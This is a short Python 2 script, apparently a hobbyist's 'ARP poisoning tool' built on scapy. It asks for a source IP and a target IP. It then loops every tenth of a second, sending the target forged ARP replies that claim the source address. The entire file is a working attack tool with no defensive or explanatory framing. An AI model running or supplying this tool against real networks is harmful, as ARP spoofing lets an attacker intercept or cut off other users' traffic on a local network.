import sched, time
from scapy.all import *

print "ARP poisoning tool by Roy"
sourceIP = raw_input("Enter Source IP: ")
destIP = raw_input('Enter Destination IP: ')

print sourceIP;
print destIP
sched = sched.scheduler(time.time, time.sleep)


def sendARPIsAt(schedu):
    send(ARP(op=ARP.is_at, psrc=sourceIP, hwdst="ff:ff:ff:ff:ff:ff", pdst=destIP))
    print "Sending ARP replay to " + destIP
    schedu.enter(0.1, 1, sendARPIsAt, (schedu,))

sched.enter(0.1, 1, sendARPIsAt, (sched,))
sched.run()
